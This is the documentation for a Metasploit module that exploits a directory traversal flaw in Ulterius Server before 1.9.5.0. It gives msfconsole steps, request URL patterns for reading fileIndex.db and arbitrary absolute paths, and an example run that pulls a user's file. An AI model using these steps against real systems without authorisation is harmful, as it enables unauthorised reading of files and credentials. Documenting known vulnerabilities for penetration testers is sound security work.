## Overview

This module exploits a directory traversal vulnerability in [Ulterius Server < v1.9.5.0](https://github.com/Ulterius/server/releases). The directory traversal flaw occurs in Ulterius Server's HttpServer.Process function call. While processing file requests, the HttpServer.Process function does not validate that the requested file is within the web server's root directory or a subdirectory.

## Verification Steps

- [ ] Install Ulterius Server < v1.9.5.0
- [ ] `./msfconsole`
- [ ] `use auxiliary/admin/http/ulterius_file_download`
- [ ] `set index true`
- [ ] `set targeturi '/…/fileIndex.db'`
- [ ] `set rhost <rhost>`
- [ ] `run`
- [ ] Verify loot contains file system paths from remote file system.
- [ ] `set index false`
- [ ] `set targeturi '/C:/<path>/<to>/<file>'`
- [ ] `run`
- [ ] Verify contents of file

## Exploiting the Vulnerability 

When requesting a file, a relative or absolute file path is needed so the appropriate request can be generated. Fortunately, Ulterius Server creates a file called fileIndex.db, which contains filenames and directories located on the server. By requesting fileIndex.db and parsing the retrieved data, absolute file paths can be retrieved for files hosted on the server. Using the information retrieved from parsing fileIndex.db, additional requests can be generated to download desired files.

As noted in the [EDB PoC](https://www.exploit-db.com/exploits/43141/), the fileIndex.db is usually located at:

`http://ulteriusURL:22006/.../fileIndex.db`

Note: 22006 was the default port after setting up the Ulterius Server.

After retrieving absolute paths for files, the files can be retrieved by sending requests of the form:

`http://ulteriusURL:22006/<DriveLetter>:/<path>/<to>/<file>`

Note: The [EDB PoC](https://www.exploit-db.com/exploits/43141/) used relative paths to download files but absolute paths can be used on Windows-platforms as well, because the HttpServer.Process function made use of the [Path.Combine](https://msdn.microsoft.com/en-us/library/fyy7a5kt(v=vs.110).aspx) function.

> If *path2* includes a root, *path2* is returned. 

## Example Execution

This module was testing on Windows 7 SP1 x64.

```
msf5 auxiliary(admin/http/ulterius_file_download) > options

Module options (auxiliary/admin/http/ulterius_file_download):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INDEX      false            no        Attempt to retrieve and parse fileIndex.db
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      22006            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The path of the web application
   VHOST                       no        HTTP server virtual host

msf5 auxiliary(admin/http/ulterius_file_download) > set index true
index => true
msf5 auxiliary(admin/http/ulterius_file_download) > set targeturi '/.../fileIndex.db'
targeturi => /.../fileIndex.db
msf5 auxiliary(admin/http/ulterius_file_download) > set rhost 172.22.222.122
rhost => 172.22.222.122
msf5 auxiliary(admin/http/ulterius_file_download) > run

[*] Starting to parse fileIndex.db...
[*] Remote file paths saved in: filepath
[*] Auxiliary module execution completed
msf5 auxiliary(admin/http/ulterius_file_download) > set index false
index => false
msf5 auxiliary(admin/http/ulterius_file_download) > set targeturi '/C:/users/pwnduser/desktop/tmp.txt'
targeturi => /C:/users/pwnduser/desktop/tmp.txt
msf5 auxiliary(admin/http/ulterius_file_download) > run

[*] Username: pwnduser
Password: pleasedonthackme
^not the actual password... nice try
[*] Auxiliary module execution completed
msf5 auxiliary(admin/http/ulterius_file_download) > 
```
